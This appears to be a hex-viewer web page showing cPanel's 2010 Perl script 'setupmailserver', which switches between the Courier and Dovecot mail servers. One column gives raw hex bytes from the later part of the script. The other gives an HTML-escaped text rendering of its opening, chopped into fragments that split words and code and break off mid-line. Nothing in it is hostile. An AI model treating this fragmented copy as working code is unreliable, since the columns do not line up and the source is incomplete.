2D 72 65 63 6F 6E 66 69 67 27 20 29 3B 0A 0A 20 20 20 20 20 20 20 <br>20 70 72 69 6E 74 20 22 5C 6E 52 65 73 74 61 72 74 69 6E 67 20 43 6F 75 <br>72 69 65 72 5C 6E 22 3B 0A 20 20 20 20 20 20 20 20 73 79 73 74 65 6D 28 <br>27 2F 73 63 72 69 70 74 73 2F 72 65 73 74 61 72 74 73 72 76 5F 69 6D 61 <br>70 27 29 3B 0A 20 20 20 20 7D 0A 20 20 20 20 65 6C 73 65 20 7B 0A 20 20 <br>20 20 20 20 20 20 66 6F 72 65 61 63 68 20 6D 79 20 24 73 65 72 76 69 63 <br>65 20 28 71 77 28 63 6F 75 72 69 65 72 2D 61 75 74 68 6C 69 62 20 20 63 <br>6F 75 72 69 65 72 2D 69 6D 61 70 29 29 20 7B 0A 20 20 20 20 20 20 20 20 <br>20 20 20 20 70 72 69 6E 74 20 22 5C 6E 45 6E 61 62 6C 69 6E 67 20 24 73 <br>65 72 76 69 63 65 20 69 6E 20 69 6E 69 74 20 73 79 73 74 65 6D 5C 6E 22 <br>3B 0A 20 20 20 20 20 20 20 20 20 20 20 20 6D 79 20 24 6F 75 74 70 75 74 <br>20 3D 20 24 69 6E 69 74 2D 3E 72 75 6E 5F 63 6F 6D 6D 61 6E 64 5F 66 6F <br>72 5F 6F 6E 65 28 20 27 65 6E 61 62 6C 65 27 2C 20 24 73 65 72 76 69 63 <br>65 20 29 3B 0A 20 20 20 20 20 20 20 20 20 20 20 20 70 72 69 6E 74 20 22 <br>5C 6E 53 74 61 72 74 69 6E 67 20 24 73 65 72 76 69 63 65 5C 6E 22 3B 0A <br>20 20 20 20 20 20 20 20 20 20 20 20 24 6F 75 74 70 75 74 20 3D 20 24 69 <br>6E 69 74 2D 3E 72 75 6E 5F 63 6F 6D 6D 61 6E 64 28 20 24 73 65 72 76 69 <br>63 65 2C 20 27 73 74 61 72 74 27 20 29 3B 0A 20 20 20 20 20 20 20 20 7D <br>0A 20 20 20 20 7D 0A 20 20 20 20 70 72 69 6E 74 20 22 5C 6E 45 6E 61 62 <br>6C 69 6E 67 20 43 6F 75 72 69 65 72 20 75 70 64 61 74 65 73 5C 6E 22 3B <br>0A 20 20 20 20 24 6F 72 69 67 5F 75 70 64 61 74 65 63 6F 6E 66 7B 27 43 <br>4F 55 52 49 45 52 55 50 27 7D 20 3D 20 27 69 6E 68 65 72 69 74 27 3B 0A <br>20 20 20 20 24 6F 72 69 67 5F 75 70 64 61 74 65 63 6F 6E 66 7B 27 44 4F <br>56 45 43 4F 54 55 50 27 7D 20 3D 20 27 6E 65 76 65 72 27 3B 0A 20 20 20 <br>20 43 70 61 6E 65 6C 3A 3A 55 70 64 61 74 65 3A 3A 73 61 76 65 75 70 64 <br>61 74 65 63 6F 6E 66 69 67 28 24 75 70 64 61 74 65 63 6F 6E 66 29 3B 0A <br>7D 0A 0A 23 20 42 6F 74 68 20 44 6F 76 65 63 6F 74 20 61 6E 64 20 43 6F <br>75 72 69 65 72 20 61 72 65 20 6D 6F 6E 69 74 6F 72 65 64 20 62 79 20 63 <br>68 6B 73 72 76 64 20 75 73 69 6E 67 20 72 65 73 74 61 72 74 73 72 76 5F <br>69 6D 61 70 0A 73 75 62 20 65 6E 61 62 6C 65 5F 63 68 6B 73 72 76 64 5F <br>6D 6F 6E 69 74 6F 72 69 6E 67 20 7B 0A 20 20 20 20 6D 79 20 25 6D 6F 6E <br>69 74 6F 72 65 64 5F 73 65 72 76 69 63 65 73 20 3D 20 43 70 61 6E 65 6C <br>3A 3A 43 68 6B 73 65 72 76 64 3A 3A 67 65 74 6D 6F 6E 69 74 6F 72 65 64 <br>28 29 3B 0A 20 20 20 20 69 66 20 28 20 24 6D 6F 6E 69 74 6F 72 65 64 5F <br>73 65 72 76 69 63 65 73 7B 27 69 6D 61 70 27 7D 20 29 20 7B 0A 20 20 20 <br>20 20 20 20 20 70 72 69 6E 74 20 22 5C 6E 43 68 6B 73 72 76 64 20 6D 6F <br>6E 69 74 6F 72 69 6E 67 20 69 73 20 65 6E 61 62 6C 65 64 5C 6E 22 3B 0A <br>20 20 20 20 7D 0A 20 20 20 20 65 6C 73 65 20 7B 0A 20 20 20 20 20 20 20 <br>20 70 72 69 6E 74 20 22 5C 6E 45 6E 61 62 6C 69 6E 67 20 63 68 6B 73 72 <br>76 64 20 6D 6F 6E 69 74 6F 72 69 6E 67 5C 6E 22 3B 0A 20 20 20 20 20 20 <br>20 20 43 70 61 6E 65 6C 3A 3A 43 68 6B 73 65 72 76 64 3A 3A 65 6E 61 62 <br>6C 65 28 27 69 6D 61 70 27 29 3B 0A 20 20 20 20 20 20 20 20 73 79 73 74 <br>65 6D 28 27 2F 73 63 72 69 70 74 73 2F 72 65 73 74 61 72 74 73 72 76 5F <br>63 68 6B 73 72 76 64 27 29 3B 0A 20 20 20 20 7D 0A 7D 0A 0A 73 75 62 20 <br>72 65 63 6F 6E 66 69 67 75 72 65 5F 65 78 69 6D 20 7B 0A 20 20 20 20 70 <br>72 69 6E 74 20 22 5C 6E 52 65 63 6F 6E 66 69 67 75 72 69 6E 67 20 45 58 <br>49 4D 20 66 6F 72 20 6E 65 77 20 6D 61 69 6C 73 65 72 76 65 72 5C 6E 22 <br>3B 0A 20 20 20 20 6D 79 20 24 6F 75 74 70 75 74 20 3D 20 43 70 61 6E 65 <br>6C 3A 3A 53 61 66 65 52 75 6E 3A 3A 45 72 72 6F 72 73 3A 3A 73 61 66 65 <br>72 75 6E 61 6C 6C 65 72 72 6F 72 73 28 27 2F 73 63 72 69 70 74 73 2F 62 <br>75 69 6C 64 65 78 69 6D 63 6F 6E 66 27 29 3B 0A 20 20 20 20 69 66 20 28 <br>24 3F 29 20 7B 0A 20 20 20 20 20 20 20 20 24 65 72 72 6F 72 5F 63 6F 75 <br>6E 74 2B 2B 3B 0A 20 20 20 20 20 20 20 20 70 72 69 6E 74 20 24 6F 75 74 <br>70 75 74 3B 0A 20 20 20 20 20 20 20 20 70 72 69 6E 74 20 22 5C 6E 57 41 <br>52 4E 49 4E 47 3A 20 45 58 49 4D 20 77 69 6C 6C 20 6E 6F 74 20 62 65 20 <br>72 65 73 74 61 72 74 65 64 21 5C 6E 22 3B 0A 20 20 20 20 7D 0A 20 20 20 <br>20 65 6C 73 65 20 7B 0A 20 20 20 20 20 20 20 20 70 72 69 6E 74 20 22 5C <br>6E 52 65 73 74 61 72 74 69 6E 67 20 45 58 49 4D 5C 6E 22 3B 0A 20 20 20 <br>20 20 20 20 20 73 79 73 74 65 6D 28 27 2F 73 63 72 69 70 74 73 2F 72 65 <br>73 74 61 72 74 73 72 76 5F 65 78 69 6D 27 29 3B 0A 20 20 20 20 7D 0A 7D <br>0A 0A 73 75 62 20 75 73 61 67 65 20 7B 0A 20 20 20 20 70 72 69 6E 74 20 <br>22 55 73 61 67 65 3A 20 73 65 74 75 70 6D 61 69 6C 73 65 72 76 65 72 20 <br>5B 6F 70 74 69 6F 6E 73 5D 20 3C 6D 61 69 6C 73 65 72 76 65 72 3E 5C 6E <br>5C 6E 22 3B 0A 20 20 20 20 70 72 69 6E 74 20 22 4F 70 74 69 6F 6E 73 3A <br>5C 6E 22 3B 0A 20 20 20 20 70 72 69 6E 74 20 22 20 20 2D 2D 66 6F 72 63 <br>65 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 50 65 72 <br>66 6F 72 6D 20 63 6F 6E 76 65 72 73 69 6F 6E 20 65 76 65 6E 20 69 66 20 <br>73 65 72 76 65 72 20 69 73 20 61 6C 72 65 61 64 79 20 63 6F 6E 66 69 67 <br>75 72 65 64 5C 6E 22 3B 0A 20 20 20 20 70 72 69 6E 74 20 22 20 20 2D 2D <br>63 75 72 72 65 6E 74 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 <br>20 44 69 73 70 6C 61 79 20 74 68 65 20 63 75 72 72 65 6E 74 6C 79 20 63 <br>6F 6E 66 69 67 75 72 65 64 20 6D 61 69 6C 20 73 65 72 76 65 72 5C 6E 22 <br>3B 0A 20 20 20 20 70 72 69 6E 74 20 22 20 20 2D 2D 73 6B 69 70 2D 6D 61 <br>69 6C 64 69 72 2D 63 6F 6E 76 65 72 73 69 6F 6E 20 20 44 6F 6E 27 74 20 <br>63 6F 6E 76 65 72 74 20 75 73 65 72 20 6D 61 69 6C 64 69 72 73 20 64 75 <br>72 69 6E 67 20 74 68 65 20 73 65 72 76 65 72 20 63 6F 6E 76 65 72 73 69 <br>6F 6E 5C 6E 22 3B 0A 20 20 20 20 70 72 69 6E 74 20 22 5C 6E 22 3B 0A 20 <br>20 20 20 70 72 69 6E 74 20 22 4D 61 69 6C 53 65 72 76 65 72 73 3A 5C 6E <br>22 3B 0A 20 20 20 20 70 72 69 6E 74 20 22 20 20 63 6F 75 72 69 65 72 20 <br>20 20 20 53 74 61 6E 64 61 72 64 20 6D 61 69 6C 20 73 65 72 76 65 72 20 <br>6F 6E 20 63 50 61 6E 65 6C 20 73 79 73 74 65 6D 73 5C 6E 22 3B 0A 20 20 <br>20 20 70 72 69 6E 74 20 22 20 20 64 6F 76 65 63 6F 74 20 20 20 20 4C 6F <br>77 65 72 20 6D 65 6D 6F 72 79 20 75 73 61 67 65 20 6D 61 69 6C 20 73 65 <br>72 76 65 72 5C 6E 22 3B 0A 20 20 20 20 70 72 69 6E 74 20 22 20 20 64 69 <br>73 61 62 6C 65 64 20 20 20 44 69 73 61 62 6C 65 20 6C 6F 63 61 6C 20 50 <br>4F 50 33 20 61 6E 64 20 49 4D 41 50 20 66 75 6E 63 74 69 6F 6E 61 6C 69 <br>74 79 5C 6E 22 3B 0A 20 20 20 20 70 72 69 6E 74 20 22 5C 6E 22 3B 0A 0A <br>20 20 20 20 65 78 69 74 20 30 3B 0A 7D 0A </td><td bgcolor=000000>#!/usr/bin/perl&nbsp;#&nbsp;cpanel<br>&nbsp;-&nbsp;setupmailserver&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Copyri<br>ght(c)&nbsp;2010&nbsp;cPanel,&nbsp;Inc.<br>&nbsp;#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;All&nbsp;rights&nbsp;<br>Reserved.&nbsp;#&nbsp;copyright@cp<br>anel.net&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;http://cpanel.net&nbsp;#&nbsp;Thi<br>s&nbsp;code&nbsp;is&nbsp;subject&nbsp;to&nbsp;the<br>&nbsp;cPanel&nbsp;license.&nbsp;Unautho<br>rized&nbsp;copying&nbsp;is&nbsp;prohibi<br>ted&nbsp;&nbsp;BEGIN&nbsp;{&nbsp;unshift&nbsp;@IN<br>C,&nbsp;'/usr/local/cpanel';&nbsp;<br>}&nbsp;&nbsp;use&nbsp;strict;&nbsp;use&nbsp;Cpane<br>l::Config&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;();&nbsp;u<br>se&nbsp;Cpanel::Chkservd&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;();&nbsp;use&nbsp;Cpanel::Sys::<br>OS&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;();&nbsp;use&nbsp;Cpane<br>l::Services&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;();&nbsp;u<br>se&nbsp;Cpanel::SafeRun::Erro<br>rs&nbsp;();&nbsp;use&nbsp;Cpanel::SSLCe<br>rts&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;();&nbsp;use&nbsp;Cpane<br>l::Usage&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;();&nbsp;u<br>se&nbsp;Cpanel::PID&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;();&nbsp;use&nbsp;Cpanel::Init&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;();&nbsp;use&nbsp;Cpane<br>l::Update&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;();&nbsp;&nbsp;<br>my&nbsp;$help&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;0;&nbsp;my&nbsp;$man&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;0;&nbsp;my&nbsp;$fo<br>rce&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;<br>0;&nbsp;my&nbsp;$current&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;0;&nbsp;my&nbsp;$skip_mai<br>ldir_conversion&nbsp;=&nbsp;0;&nbsp;$|&nbsp;<br>=&nbsp;1;&nbsp;&nbsp;delete&nbsp;$ENV{'cp_se<br>curity_token'};&nbsp;delete&nbsp;$<br>ENV{'HTTP_REFERER'};&nbsp;&nbsp;#&nbsp;<br>Argument&nbsp;processing&nbsp;my&nbsp;%<br>opts&nbsp;=&nbsp;(&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'force'&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&gt;&nbsp;\\$forc<br>e,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'current'&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&gt;&nbsp;\\$current,&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;'skip-maildir-convers<br>ion'&nbsp;=&gt;&nbsp;\\$skip_maildir_c<br>onversion,&nbsp;);&nbsp;&nbsp;Cpanel::U<br>sage::wrap_options(&nbsp;\\@AR<br>GV,&nbsp;\\&amp;usage,&nbsp;\\%opts&nbsp;);&nbsp;&nbsp;<br>@ARGV&nbsp;=&nbsp;(&nbsp;grep(&nbsp;!/^--/,&nbsp;<br>@ARGV&nbsp;)&nbsp;);&nbsp;&nbsp;my&nbsp;$selected<br>_mailserver&nbsp;=&nbsp;shift;&nbsp;usa<br>ge()&nbsp;unless&nbsp;(&nbsp;$selected_<br>mailserver&nbsp;||&nbsp;$current&nbsp;)<br>;&nbsp;&nbsp;my&nbsp;$cpconf_ref&nbsp;=&nbsp;Cpan<br>el::Config::loadcpconf()<br>;&nbsp;my&nbsp;$storage_type&nbsp;=&nbsp;$cp<br>conf_ref-&gt;{'maildir'}&nbsp;?&nbsp;<br>'maildir'&nbsp;:&nbsp;'mbox';&nbsp;$cpc<br>onf_ref-&gt;{'mailserver'}&nbsp;<br>=&nbsp;$storage_type&nbsp;eq&nbsp;'mbox<br>'&nbsp;?&nbsp;'cppop'&nbsp;:&nbsp;defined&nbsp;$c<br>pconf_ref-&gt;{'mailserver'<br>}&nbsp;?&nbsp;$cpconf_ref-&gt;{'mails<br>erver'}&nbsp;:&nbsp;'courier';&nbsp;my&nbsp;<br>$last_active_mailserver&nbsp;<br>=&nbsp;$cpconf_ref-&gt;{'mailser<br>ver'};&nbsp;my&nbsp;$current_mails<br>erver&nbsp;=&nbsp;Cpanel::Services<br>::is_enabled('mail')&nbsp;?&nbsp;$<br>cpconf_ref-&gt;{'mailserver<br>'}&nbsp;:&nbsp;'disabled';&nbsp;&nbsp;if&nbsp;($c<br>urrent)&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;Cur<br>rent&nbsp;mailserver&nbsp;type:&nbsp;${<br>current_mailserver}\\n&quot;;&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;Current&nbsp;stora<br>ge&nbsp;format:&nbsp;${storage_typ<br>e}\\n&quot;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit&nbsp;0;&nbsp;}&nbsp;&nbsp;if<br>&nbsp;(&nbsp;$storage_type&nbsp;eq&nbsp;'mbo<br>x'&nbsp;)&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;$selecte<br>d_mailserver&nbsp;eq&nbsp;'cppop'&nbsp;<br>)&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;Alrea<br>dy&nbsp;configured.\\n&quot;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;prin<br>t&nbsp;&quot;Before&nbsp;selecting&nbsp;a&nbsp;ne<br>w&nbsp;mail&nbsp;server&nbsp;you&nbsp;must&nbsp;f<br>irst&nbsp;convert\\n&quot;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;print&nbsp;&quot;to&nbsp;the&nbsp;maildir&nbsp;s<br>torage&nbsp;format&nbsp;using&nbsp;/scr<br>ipts/convert2maildir\\n&quot;;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit&nbsp;0;&nbsp;}&nbsp;&nbsp;if<br>&nbsp;(&nbsp;!$force&nbsp;&amp;&amp;&nbsp;$current_m<br>ailserver&nbsp;eq&nbsp;$selected_m<br>ailserver&nbsp;)&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;<br>&quot;Already&nbsp;configured.\\n&quot;;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit&nbsp;0;&nbsp;}&nbsp;&nbsp;unless&nbsp;(<br>&nbsp;$selected_mailserver&nbsp;eq<br>&nbsp;'dovecot'&nbsp;||&nbsp;$selected_<br>mailserver&nbsp;eq&nbsp;'courier'&nbsp;<br>||&nbsp;$selected_mailserver&nbsp;<br>eq&nbsp;'disabled'&nbsp;)&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pr<br>int&nbsp;&quot;Unknown&nbsp;mailserver&nbsp;<br>type&nbsp;specified.\\nTry&nbsp;$0&nbsp;<br>--help\\n&quot;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit&nbsp;1;&nbsp;}<br>&nbsp;&nbsp;if&nbsp;(&nbsp;$&gt;&nbsp;!=&nbsp;0&nbsp;)&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;d<br>ie&nbsp;&quot;Conversion&nbsp;process&nbsp;m<br>ust&nbsp;be&nbsp;performed&nbsp;as&nbsp;root<br>&quot;;&nbsp;}&nbsp;&nbsp;my&nbsp;$pid_obj&nbsp;=&nbsp;Cpan<br>el::PID-&gt;new(&nbsp;{&nbsp;'pid_fil<br>e'&nbsp;=&gt;&nbsp;'/var/run/setupmai<br>lserver.pid'&nbsp;}&nbsp;);&nbsp;unless<br>&nbsp;(&nbsp;$pid_obj-&gt;create_pid_<br>file()&nbsp;&gt;&nbsp;0&nbsp;)&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print<br>&nbsp;&quot;Setupmailserver&nbsp;appear<br>s&nbsp;to&nbsp;be&nbsp;running&nbsp;already.<br>\\n&quot;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;Please&nbsp;w<br>ait&nbsp;for&nbsp;the&nbsp;conversion&nbsp;t<br>o&nbsp;finish&nbsp;before&nbsp;attempti<br>ng&nbsp;another.\\n&quot;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit<br>&nbsp;1;&nbsp;}&nbsp;&nbsp;$cpconf_ref-&gt;{'ma<br>ilserver'}&nbsp;=&nbsp;$selected_m<br>ailserver&nbsp;if&nbsp;(&nbsp;$selected<br>_mailserver&nbsp;ne&nbsp;'disabled<br>'&nbsp;);&nbsp;Cpanel::Config::sav<br>ecpconf($cpconf_ref);&nbsp;my<br>&nbsp;$distro&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;Cpanel::<br>Sys::OS::getos();&nbsp;my&nbsp;$in<br>it&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;Cpanel::Init<br>-&gt;new();&nbsp;my&nbsp;$error_count<br>&nbsp;=&nbsp;0;&nbsp;&nbsp;#branch&nbsp;to&nbsp;uninsa<br>ll/install&nbsp;functions&nbsp;dis<br>able_chksrvd_monitoring(<br>);&nbsp;&nbsp;if&nbsp;(&nbsp;$selected_mails<br>erver&nbsp;eq&nbsp;'courier'&nbsp;)&nbsp;{&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;disable_none();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;d<br>isable_dovecot();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;en<br>able_courier();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;enab<br>le_chksrvd_monitoring();<br>&nbsp;}&nbsp;elsif&nbsp;(&nbsp;$selected_mai<br>lserver&nbsp;eq&nbsp;'dovecot'&nbsp;)&nbsp;{<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;disable_none();&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;disable_courier();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>enable_dovecot();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;en<br>able_chksrvd_monitoring(<br>);&nbsp;}&nbsp;else&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;enable_n<br>one();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;disable_dovec<br>ot();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;disable_courie<br>r();&nbsp;}&nbsp;&nbsp;reconfigure_exim<br>();&nbsp;run_fastmail();&nbsp;$pid<br>_obj-&gt;remove_pid_file();<br>&nbsp;if&nbsp;($error_count)&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;print&nbsp;&quot;\\nWARNING:&nbsp;Some&nbsp;<br>errors&nbsp;encountered&nbsp;durin<br>g&nbsp;the&nbsp;conversion&nbsp;process<br>\\n&quot;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit&nbsp;1;&nbsp;}&nbsp;else&nbsp;<br>{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;\\nMailserve<br>r&nbsp;conversion&nbsp;complete\\n&quot;<br>;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit&nbsp;0;&nbsp;}&nbsp;&nbsp;sub&nbsp;run<br>_fastmail&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;system&nbsp;'<br>/scripts/fastmail';&nbsp;}&nbsp;&nbsp;s<br>ub&nbsp;disable_none&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;un<br>link&nbsp;'/etc/imapdisable'&nbsp;<br>&nbsp;&nbsp;if&nbsp;(&nbsp;-e&nbsp;'/etc/imapdisa<br>ble'&nbsp;);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;unlink&nbsp;'/etc<br>/cpimapdisable'&nbsp;if&nbsp;(&nbsp;-e&nbsp;<br>'/etc/cpimapdisable'&nbsp;);&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;unlink&nbsp;'/etc/imapddi<br>sable'&nbsp;&nbsp;if&nbsp;(&nbsp;-e&nbsp;'/etc/im<br>apddisable'&nbsp;);&nbsp;}&nbsp;&nbsp;sub&nbsp;di<br>sable_dovecot&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;prin<br>t&nbsp;&quot;\\nHalting&nbsp;Dovecot\\n&quot;;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;my&nbsp;$output&nbsp;=&nbsp;$init-<br>&gt;run_command(&nbsp;'dovecot',<br>&nbsp;'stop'&nbsp;);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;\\n<br>Disabling&nbsp;Dovecot&nbsp;in&nbsp;ini<br>t&nbsp;system\\n&quot;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$output<br>&nbsp;=&nbsp;$init-&gt;run_command_fo<br>r_one(&nbsp;'disable',&nbsp;'dovec<br>ot'&nbsp;);&nbsp;}&nbsp;&nbsp;sub&nbsp;disable_co<br>urier&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;\\nHal<br>ting&nbsp;Courier\\n&quot;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;my&nbsp;<br>@services&nbsp;=&nbsp;qw(courier-i<br>map&nbsp;courier-authlib);&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;if&nbsp;(&nbsp;$distro&nbsp;eq&nbsp;'freeb<br>sd'&nbsp;)&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;@service<br>s&nbsp;=&nbsp;qw(courier-imap-pop3<br>d&nbsp;courier-imap-pop3d-ssl<br>&nbsp;courier-imap-imapd&nbsp;cour<br>ier-imap-imapd-ssl&nbsp;couri<br>er-authdaemond);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;foreach&nbsp;my&nbsp;$service&nbsp;(<br>@services)&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;my&nbsp;<br>$output&nbsp;=&nbsp;$init-&gt;run_com<br>mand(&nbsp;$service,&nbsp;'stop'&nbsp;)<br>;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;\\nDis<br>abling&nbsp;Courier&nbsp;in&nbsp;init&nbsp;s<br>ystem\\n&quot;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;foreach&nbsp;my<br>&nbsp;$service&nbsp;(@services)&nbsp;{&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;my&nbsp;$output&nbsp;=&nbsp;$in<br>it-&gt;run_command_for_one(<br>&nbsp;'disable',&nbsp;$service&nbsp;);&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;}&nbsp;&nbsp;#&nbsp;Strictly&nbsp;spea<br>king,&nbsp;touching&nbsp;/etc/imap<br>disable&nbsp;will&nbsp;cause&nbsp;chksr<br>vd&nbsp;to&nbsp;skip&nbsp;over&nbsp;#&nbsp;restar<br>ting&nbsp;Dovecot&nbsp;or&nbsp;Courier,<br>&nbsp;but&nbsp;this&nbsp;will&nbsp;stop&nbsp;it&nbsp;f<br>rom&nbsp;even&nbsp;polling&nbsp;for&nbsp;the<br>se&nbsp;processes&nbsp;sub&nbsp;disable<br>_chksrvd_monitoring&nbsp;{&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;my&nbsp;%monitored_services<br>&nbsp;=&nbsp;Cpanel::Chkservd::get<br>monitored();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;!$<br>monitored_services{'imap<br>'}&nbsp;&amp;&amp;&nbsp;!$monitored_servic<br>es{'po